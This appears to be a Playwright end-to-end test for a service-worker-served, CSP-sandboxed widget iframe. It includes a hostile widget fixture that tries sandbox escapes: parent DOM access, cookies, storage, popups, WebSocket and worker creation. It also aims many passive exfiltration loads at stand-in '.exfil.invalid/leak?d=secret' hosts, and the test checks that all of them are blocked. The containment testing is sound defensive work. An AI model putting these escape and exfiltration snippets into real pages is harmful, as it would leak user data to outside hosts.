// Real-Chromium proof for the Browser sandbox-frame path. The production
// service-worker build serves verified frame grants with the frame
// response policy; the Runtime navigates a bare iframe to the grant,
// because a service worker never sees a sandboxed iframe's navigation,
// and the response sandbox directive sandboxes the document. The
// served bytes execute through the production handshake: fragment
// hello token, single init over the window bus, ready report with the
// revision echoed on the transferred port. A second frame proves the
// served policy is active: eval is blocked and attributed to
// script-src.
//
// The probe stands in for the host page at exactly one seam: it answers
// the worker's media-authorization ask the way media-authorization.ts
// does. Everything else is production: the built worker, the IndexedDB
// schema, the OPFS verified store, the production shell policy, and
// frame bytes assembled by the SDK's own builder.
import { createHash, randomUUID } from "node:crypto";
import { execFileSync } from "node:child_process";
import { createServer, type Server } from "node:http";
import { mkdtempSync, readFileSync, statSync } from "node:fs";
import { tmpdir } from "node:os";
import { extname, join } from "node:path";
import { fileURLToPath, pathToFileURL } from "node:url";
import { expect, test } from "@playwright/test";

const framesDir = fileURLToPath(new URL(".", import.meta.url));
const root = join(framesDir, "..", "..", "..", "..");
const dist = join(root, "apps", "player-web", "dist");
const PROTOCOL = "tilecast.widget.bridge/1";

/** The production shell policy, extracted from the server source. */
function playerCSP(): string {
  const source = readFileSync(
    join(root, "apps", "server", "internal", "web", "player.go"),
    "utf8",
  );
  const match = /const playerCSP = "([^"]*)"/.exec(source);
  if (!match) throw new Error("playerCSP moved in player.go");
  const policy = match[1]!;
  if (!policy.includes("frame-src https: 'self'")) {
    throw new Error(
      `production shell policy lost same-origin framing: ${policy}`,
    );
  }
  return policy;
}

const CONTENT_TYPES: Record<string, string> = {
  ".html": "text/html",
  ".js": "text/javascript",
  ".css": "text/css",
  ".json": "application/json",
  ".png": "image/png",
  ".svg": "image/svg+xml",
  ".webmanifest": "application/manifest+json",
};

const PROBE_HTML = `<!DOCTYPE html><html><head><meta charset="utf-8"><title>frame probe</title></head><body><div id="probe">frame probe</div></body></html>`;

// A Widget that reports whether the served frame policy is active.
// Without a policy, indirect eval succeeds; under the frame policy it
// throws, and the violation event attributes the throw to script-src.
const CSP_BUNDLE = `/* E2E fixture: policy self-check. */
(function () {
  "use strict";
  function WidgetElement() {
    return Reflect.construct(HTMLElement, [], WidgetElement);
  }
  Object.setPrototypeOf(WidgetElement.prototype, HTMLElement.prototype);
  Object.setPrototypeOf(WidgetElement, HTMLElement);
  WidgetElement.prototype.connectedCallback = function () {
    var self = this;
    var revision = self[Symbol.for("tilecast.widget.inputRevision")];
    var violated = "";
    document.addEventListener("securitypolicyviolation", function (event) {
      violated = event.violatedDirective + ":" + event.disposition;
    });
    function settle(enforced) {
      self.dispatchEvent(
        new CustomEvent(
          enforced ? "tilecast-widget-ready" : "tilecast-widget-error",
          {
            bubbles: true,
            detail: enforced
              ? { revision: revision }
              : { revision: revision, code: "policy_missing" },
          }
        )
      );
    }
    var blocked;
    try {
      (0, eval)("1+1");
      blocked = false;
    } catch (err) {
      blocked = true;
    }
    setTimeout(function () {
      settle(blocked && violated === "script-src:enforce");
    }, 250);
  };
  globalThis.__tilecastWidgetDefinition = {
    type: "acme.spike.csp",
    version: 1,
    tagName: "acme-spike-csp",
    element: WidgetElement,
  };
})();`;

// A hostile Widget: every escape attempt must fail, and the frame
// reaches ready only when none of them did. Anything that escapes
// is named in the error code for the assertion below.
const HOSTILE_BUNDLE = `/* E2E fixture: hostile escape attempts. */
(function () {
  "use strict";
  function WidgetElement() {
    return Reflect.construct(HTMLElement, [], WidgetElement);
  }
  Object.setPrototypeOf(WidgetElement.prototype, HTMLElement.prototype);
  Object.setPrototypeOf(WidgetElement, HTMLElement);
  WidgetElement.prototype.connectedCallback = function () {
    var self = this;
    var revision = self[Symbol.for("tilecast.widget.inputRevision")];
    var escaped = [];
    function sync(name, fn, bad) {
      var value;
      try {
        value = fn();
      } catch (err) {
        return;
      }
      if (bad(value)) escaped.push(name);
    }
    sync("parent-dom", function () {
      return window.top.document;
    }, function () { return true; });
    sync("local-storage", function () {
      localStorage.setItem("tilecastE2E", "1");
      return localStorage.getItem("tilecastE2E");
    }, function (v) { return v === "1"; });
    sync("indexed-db", function () {
      return indexedDB.open("tilecastE2E");
    }, function () { return true; });
    sync("cookie", function () {
      document.cookie = "tilecastE2E=1";
      return document.cookie;
    }, function (v) { return v.indexOf("tilecastE2E=") !== -1; });
    sync("popup", function () {
      return window.open("https://example.invalid/");
    }, function (v) { return !!v; });
    sync("top-navigation", function () {
      return window.top.location.href;
    }, function () { return true; });
    function settle() {
      self.dispatchEvent(
        new CustomEvent(
          escaped.length ? "tilecast-widget-error" : "tilecast-widget-ready",
          {
            bubbles: true,
            detail: escaped.length
              ? { revision: revision, code: "escaped:" + escaped.join(",") }
              : { revision: revision },
          }
        )
      );
    }
    var settled = false;
    function settleOnce() {
      if (settled) return;
      settled = true;
      settle();
    }
    var waits = [];
    waits.push(
      fetch("/player/media/1/00000000-0000-4000-8000-000000000000").then(
        function () { escaped.push("fetch"); },
        function () {}
      )
    );
    try {
      var socket = new WebSocket("wss://example.invalid/");
      waits.push(
        new Promise(function (resolve) {
          var done = false;
          function finish(escapedOpen) {
            if (done) return;
            done = true;
            if (escapedOpen) escaped.push("websocket");
            resolve();
          }
          socket.onopen = function () { finish(true); };
          socket.onerror = function () { finish(false); };
          setTimeout(function () { finish(false); }, 3000);
        })
      );
    } catch (err) {
      /* blocked at construction */
    }
    // Worker construction succeeds even when the load is blocked;
    // containment means the worker never runs.
    waits.push(
      new Promise(function (resolve) {
        var w;
        try {
          w = new Worker("data:text/javascript,postMessage('x')");
        } catch (err) {
          resolve();
          return;
        }
        var done = false;
        function finish(ran) {
          if (done) return;
          done = true;
          if (ran) escaped.push("worker");
          try {
            w.terminate();
          } catch (err) {}
          resolve();
        }
        w.onmessage = function () { finish(true); };
        w.onerror = function () { finish(false); };
        setTimeout(function () { finish(false); }, 2000);
      })
    );
    // Passive exfiltration: every subresource kind a Widget can aim at an
    // attacker host must be refused by the served policy. connect-src
    // alone does not cover these; each attempt names its own host so a
    // missing violation names the escaped vector.
    var violated = [];
    document.addEventListener("securitypolicyviolation", function (event) {
      violated.push(event.blockedURI);
    });
    var passiveHosts = [];
    function aim(name, attempt) {
      var host = name + ".exfil.invalid";
      passiveHosts.push([name, host]);
      try {
        attempt("https://" + host + "/leak?d=secret");
      } catch (err) {
        /* a construction-time refusal is also a block */
        violated.push(host);
      }
    }
    aim("img", function (u) { var i = new Image(); i.src = u; });
    aim("imgplain", function (u) { var i = new Image(); i.src = u.replace("https:", "http:"); });
    aim("srcset", function (u) { var i = new Image(); i.srcset = u + " 1x"; });
    aim("video", function (u) { var v = document.createElement("video"); v.src = u; v.preload = "auto"; document.body.appendChild(v); });
    aim("audio", function (u) { var a = new Audio(); a.src = u; a.preload = "auto"; });
    aim("poster", function (u) { var v = document.createElement("video"); v.poster = u; document.body.appendChild(v); });
    aim("css", function (u) { var d = document.createElement("div"); d.style.backgroundImage = "url(" + u + ")"; d.style.width = "10px"; d.style.height = "10px"; document.body.appendChild(d); });
    aim("font", function (u) {
      var st = document.createElement("style");
      st.textContent = "@font-face{font-family:x;src:url(" + u + ")}.x{font-family:x}";
      document.head.appendChild(st);
      var d = document.createElement("span"); d.className = "x"; d.textContent = "x"; document.body.appendChild(d);
    });
    aim("stylesheet", function (u) { var l = document.createElement("link"); l.rel = "stylesheet"; l.href = u; document.head.appendChild(l); });
    aim("preload", function (u) { var l = document.createElement("link"); l.rel = "preload"; l.as = "image"; l.href = u; document.head.appendChild(l); });
    aim("prefetch", function (u) { var l = document.createElement("link"); l.rel = "prefetch"; l.href = u; document.head.appendChild(l); });
    aim("object", function (u) { var o = document.createElement("object"); o.data = u; document.body.appendChild(o); });
    aim("embed", function (u) { var e = document.createElement("embed"); e.src = u; document.body.appendChild(e); });
    aim("iframe", function (u) { var f = document.createElement("iframe"); f.src = u; document.body.appendChild(f); });
    waits.push(
      new Promise(function (resolve) {
        setTimeout(function () {
          passiveHosts.forEach(function (entry) {
            var seen = violated.some(function (uri) {
              return String(uri).indexOf(entry[1]) !== -1;
            });
            if (!seen) escaped.push("passive-" + entry[0]);
          });
          resolve();
        }, 1500);
      })
    );
    Promise.all(waits).then(settleOnce);
    setTimeout(settleOnce, 8000);
  };
  globalThis.__tilecastWidgetDefinition = {
    type: "acme.spike.hostile",
    version: 1,
    tagName: "acme-spike-hostile",
    element: WidgetElement,
  };
})();`;

/** Production frame bytes: the SDK builder around a Widget bundle. */
async function frameBuilder(): Promise<(bundle: string) => string> {
  const out = mkdtempSync(join(tmpdir(), "tilecast-frames-e2e-"));
  execFileSync(
    join(root, "node_modules", ".bin", "esbuild"),
    [
      join(root, "packages", "widget-sdk", "spike", "frame-entry.ts"),
      "--bundle",
      "--format=cjs",
      "--platform=node",
      `--outfile=${join(out, "frame-entry.cjs")}`,
      "--log-level=error",
    ],
    { stdio: "inherit" },
  );
  const { buildSandboxFrameDocument } = (await import(
    pathToFileURL(join(out, "frame-entry.cjs")).href
  )) as { buildSandboxFrameDocument(bundle: string): string };
  return buildSandboxFrameDocument;
}

let server: Server;
let origin: string;
let shellCSP: string;
let okBytes: string;
let okDigest: string;
let cspBytes: string;
let cspDigest: string;
let hostileBytes: string;
let hostileDigest: string;

test.beforeAll(async () => {
  shellCSP = playerCSP();
  const build = await frameBuilder();
  const okBundle = readFileSync(
    join(root, "packages", "widget-sdk", "spike", "fixtures", "ok.js"),
    "utf8",
  );
  // Hosted documents interpolate no token: the parent binds each attach
  // with a URL-fragment token, exactly as the executor does.
  okBytes = build(okBundle);
  okDigest = createHash("sha256").update(okBytes).digest("hex");
  cspBytes = build(CSP_BUNDLE);
  cspDigest = createHash("sha256").update(cspBytes).digest("hex");
  hostileBytes = build(HOSTILE_BUNDLE);
  hostileDigest = createHash("sha256").update(hostileBytes).digest("hex");
  server = createServer((request, response) => {
    const url = new URL(request.url ?? "/", "http://127.0.0.1");
    if (url.pathname === "/player/probe") {
      // The probe runs under the exact production shell policy.
      response.writeHead(200, {
        "Content-Type": "text/html",
        "Content-Security-Policy": shellCSP,
      });
      response.end(PROBE_HTML);
      return;
    }
    if (!url.pathname.startsWith("/player/")) {
      response.writeHead(404);
      response.end();
      return;
    }
    const rest = url.pathname.slice("/player/".length);
    const file = join(dist, rest === "" ? "index.html" : rest);
    try {
      if (!statSync(file).isFile()) throw new Error("not a file");
    } catch {
      response.writeHead(404);
      response.end();
      return;
    }
    response.writeHead(200, {
      "Content-Type":
        CONTENT_TYPES[extname(file)] ?? "application/octet-stream",
    });
    response.end(readFileSync(file));
  });
  await new Promise<void>((resolve) => {
    server.listen(0, "127.0.0.1", () => {
      const address = server.address();
      if (typeof address !== "object" || !address) throw new Error("no port");
      origin = `http://127.0.0.1:${address.port}`;
      resolve();
    });
  });
});

test.afterAll(async () => {
  if (!server) return;
  await new Promise<void>((resolve, reject) =>
    server.close((error) => (error ? reject(error) : resolve())),
  );
});

test("the built worker serves verified frames bare navigations sandbox", async ({
  page,
}) => {
  test.setTimeout(120_000);
  const okUri = `/player/widget-frame/1/${randomUUID()}`;
  const cspUri = `/player/widget-frame/1/${randomUUID()}`;
  const hostileUri = `/player/widget-frame/1/${randomUUID()}`;
  const okToken = randomUUID().replaceAll("-", "");
  const cspToken = randomUUID().replaceAll("-", "");
  const hostileToken = randomUUID().replaceAll("-", "");

  const consoleMessages: string[] = [];
  page.on("console", (message) =>
    consoleMessages.push(`${message.type()}: ${message.text()}`),
  );
  page.on("pageerror", (error) => consoleMessages.push(`pageerror: ${error}`));
  // The attacker host never resolves, but a request that left the
  // browser still reaches this handler. Nothing may.
  const exfilRequests: string[] = [];
  await page.route(/\.exfil\.invalid\//, (route) => {
    exfilRequests.push(route.request().url());
    return route.abort();
  });
  await page.goto(`${origin}/player/probe`);
  await expect(page.getByText("frame probe")).toBeVisible();

  // Register the production worker and wait until it controls this page.
  await page.evaluate(async () => {
    await navigator.serviceWorker.register("/player/service-worker.js", {
      scope: "/player/",
    });
  });
  await page.waitForFunction(
    () => navigator.serviceWorker.controller !== null,
    null,
    { timeout: 30_000 },
  );

  const report = await page.evaluate(
    async ({ ok, csp, hostile }) => {
      const failures: string[] = [];
      const check = (name: string, ok: boolean) => {
        if (!ok) failures.push(name);
      };

      // The host page authorizes its own media asks; the probe allows all.
      navigator.serviceWorker.addEventListener("message", (event) => {
        const message = event.data as {
          type?: string;
          requestId?: string;
        };
        if (message?.type !== "authorize-media" || !message.requestId) return;
        navigator.serviceWorker.controller?.postMessage({
          type: "media-authorization",
          requestId: message.requestId,
          allowed: true,
        });
      });

      // Seed the production stores: object metadata, activation, grants.
      const database = await new Promise<IDBDatabase>((resolve, reject) => {
        const open = indexedDB.open("tilecast-browser-player-v1", 2);
        open.onupgradeneeded = () => {
          for (const name of [
            "identity",
            "objects",
            "activations",
            "grants",
            "outbox",
            "commands",
          ]) {
            if (!open.result.objectStoreNames.contains(name))
              open.result.createObjectStore(name);
          }
        };
        open.onsuccess = () => resolve(open.result);
        open.onerror = () => reject(open.error);
      });
      const put = (store: string, key: string, value: unknown) =>
        new Promise<void>((resolve, reject) => {
          const transaction = database.transaction(store, "readwrite");
          transaction.oncomplete = () => resolve();
          transaction.onerror = () => reject(transaction.error);
          transaction.objectStore(store).put(value, key);
        });
      const root = await navigator.storage.getDirectory();
      const media = await root.getDirectoryHandle("tilecast-media-v1", {
        create: true,
      });
      const frames = [ok, csp, hostile];
      for (const frame of frames) {
        await put("objects", frame.digest, {
          digest: frame.digest,
          size: frame.size,
          mimeType: "text/html",
          verifiedAt: Date.now(),
          lastUsedAt: Date.now(),
          pins: ["active:slot"],
        });
        await put("grants", frame.uri, {
          slotId: "slot",
          bindingId: "binding",
          activationId: "activation",
          generation: 1,
          digest: frame.digest,
          size: frame.size,
          mimeType: "text/html",
          kind: "frame",
          trustedAt: Date.now(),
        });
        const file = await media.getFileHandle(frame.digest, {
          create: true,
        });
        const writable = await file.createWritable();
        await writable.write(frame.bytes);
        await writable.close();
      }
      await put("activations", "slot", {
        slotId: "slot",
        bindingId: "binding",
        serverInstallationId: "server",
        generation: 1,
        activationId: "activation",
        resources: [],
        frames: frames.map((frame) => ({
          digest: frame.digest,
          size: frame.size,
          mimeType: "text/html",
          packageId: "acme.spike",
          packageDigest: `sha256:${frame.digest}`,
          frameDigest: frame.digest,
        })),
        presentation: { type: "presentation" },
        plugins: { type: "plugins" },
      });

      // The worker serves the grant with the frame response policy.
      const response = await fetch(ok.uri);
      check("frame status", response.status === 200);
      check(
        "frame content type",
        response.headers.get("Content-Type") === "text/html",
      );
      check(
        "frame nosniff",
        response.headers.get("X-Content-Type-Options") === "nosniff",
      );
      check(
        "frame ancestors",
        response.headers.get("X-Frame-Options") === "SAMEORIGIN",
      );
      check(
        "frame no-store",
        response.headers.get("Cache-Control") === "no-store",
      );
      const policy = response.headers.get("Content-Security-Policy") ?? "";
      for (const directive of [
        "sandbox allow-scripts",
        "default-src 'none'",
        "connect-src 'none'",
        "worker-src 'none'",
        "object-src 'none'",
        "base-uri 'none'",
        "form-action 'none'",
      ]) {
        check(`policy ${directive}`, policy.includes(directive));
      }
      check(
        "policy media path",
        policy.includes(`${location.origin}/player/media/`),
      );
      const bytes = await response.text();
      check("frame bytes", bytes === ok.bytes);

      // An ungranted capability on the same route is nothing.
      const missing = await fetch(
        `/player/widget-frame/1/00000000-0000-4000-8000-000000000000`,
      );
      check("missing capability", missing.status === 404);

      // A served frame executes through the Runtime's hosted path: a
      // bare iframe navigates to the grant with a fragment token, the
      // worker serves the verified bytes with the sandbox directive,
      // and the probe completes the production handshake.
      const context = {
        wallClockOffsetMs: 0,
        locale: "en-US",
        timeZone: "America/Chicago",
        hourCycle: "h23",
        theme: {
          scheme: "dark",
          background: "#0e141b",
          foreground: "#f5f7fa",
          accent: "#4f9dff",
        },
        reducedMotion: false,
        mode: "playback",
      };
      const runFrame = async (frame: {
        uri: string;
        token: string;
        component: { type: string; version: number; config: object };
      }): Promise<{ revision: unknown; state: unknown }> => {
        const iframe = document.createElement("iframe");
        const helloPromise = new Promise<{
          origin: string;
          token: string;
        }>((resolve, reject) => {
          const timer = setTimeout(() => reject(new Error("no hello")), 15_000);
          window.addEventListener("message", (event) => {
            const message = event.data as {
              protocol?: string;
              kind?: string;
              helloToken?: string;
            };
            if (event.source !== iframe.contentWindow) return;
            if (event.origin !== "null") return;
            if (
              message?.protocol !== "tilecast.widget.bridge/1" ||
              message?.kind !== "frame-hello"
            ) {
              return;
            }
            if (message.helloToken !== frame.token) return;
            clearTimeout(timer);
            resolve({ origin: event.origin, token: message.helloToken });
          });
        });
        document.body.appendChild(iframe);
        // Bare on purpose: an attributed navigation would bypass the
        // worker. Nothing but the worker can serve this URL: the
        // static origin below 404s every widget-frame path.
        iframe.src = `${frame.uri}#${frame.token}`;
        const hello = await helloPromise;
        if (hello.origin !== "null" || hello.token !== frame.token) {
          throw new Error("hello failed its checks");
        }
        const nonce = `${Date.now()}-${frame.token.slice(0, 8)}`;
        const channel = new MessageChannel();
        const settledPromise = new Promise<{
          revision: unknown;
          state: unknown;
        }>((resolve, reject) => {
          const timer = setTimeout(
            () => reject(new Error("no report")),
            15_000,
          );
          channel.port1.onmessage = (event) => {
            const settled = event.data as {
              protocol?: string;
              nonce?: string;
              revision?: unknown;
              state?: unknown;
            };
            if (settled?.protocol !== "tilecast.widget.bridge/1") return;
            if (settled?.nonce !== nonce) return;
            clearTimeout(timer);
            resolve({ revision: settled.revision, state: settled.state });
          };
        });
        iframe.contentWindow?.postMessage(
          {
            protocol: "tilecast.widget.bridge/1",
            kind: "init",
            nonce,
            revision: 7,
            snapshot: {
              component: frame.component,
              documents: {},
              media: [],
              context,
            },
          },
          "*",
          [channel.port2],
        );
        return settledPromise;
      };

      try {
        const okSettled = await runFrame({
          uri: ok.uri,
          token: ok.token,
          component: {
            type: "acme.spike.ok",
            version: 1,
            config: { label: "frames-e2e" },
          },
        });
        const okState = okSettled.state as { state?: string } | null;
        check("ok ready", okState?.state === "ready");
        check("ok revision echo", okSettled.revision === 7);
      } catch (error) {
        failures.push(
          `ok frame: ${error instanceof Error ? error.message : error}`,
        );
      }

      // The served policy is active on the navigated document: the
      // self-check Widget reaches ready only when script-src blocked
      // eval and the violation event attributed it to the policy.
      try {
        const cspSettled = await runFrame({
          uri: csp.uri,
          token: csp.token,
          component: { type: "acme.spike.csp", version: 1, config: {} },
        });
        const cspState = cspSettled.state as {
          state?: string;
          code?: string;
        } | null;
        check("meta policy enforced", cspState?.state === "ready");
        if (cspState?.state !== "ready") {
          failures.push(`csp state: ${JSON.stringify(cspState)}`);
        }
      } catch (error) {
        failures.push(
          `csp frame: ${error instanceof Error ? error.message : error}`,
        );
      }

      // A hostile document runs contained: parent DOM, storage,
      // cookies, popups, workers, top navigation, fetch, and
      // WebSocket must all fail, and the frame reports ready only
      // when none of them escaped.
      try {
        const hostileSettled = await runFrame({
          uri: hostile.uri,
          token: hostile.token,
          component: {
            type: "acme.spike.hostile",
            version: 1,
            config: {},
          },
        });
        const hostileState = hostileSettled.state as {
          state?: string;
          code?: string;
        } | null;
        check("hostile contained", hostileState?.state === "ready");
        if (hostileState?.state !== "ready") {
          failures.push(`hostile state: ${JSON.stringify(hostileState)}`);
        }
      } catch (error) {
        failures.push(
          `hostile frame: ${error instanceof Error ? error.message : error}`,
        );
      }
      check("no top navigation", window.location.pathname === "/player/probe");
      database.close();
      return failures;
    },
    {
      ok: {
        uri: okUri,
        token: okToken,
        digest: okDigest,
        size: Buffer.byteLength(okBytes),
        bytes: okBytes,
      },
      csp: {
        uri: cspUri,
        token: cspToken,
        digest: cspDigest,
        size: Buffer.byteLength(cspBytes),
        bytes: cspBytes,
      },
      hostile: {
        uri: hostileUri,
        token: hostileToken,
        digest: hostileDigest,
        size: Buffer.byteLength(hostileBytes),
        bytes: hostileBytes,
      },
    },
  );
  expect(exfilRequests, "passive requests that left the frame").toEqual([]);
  if (report.length > 0) {
    console.log(`probe failures: ${JSON.stringify(report)}`);
    console.log(`console: ${JSON.stringify(consoleMessages.slice(0, 20))}`);
  }
  expect(report).toEqual([]);
});
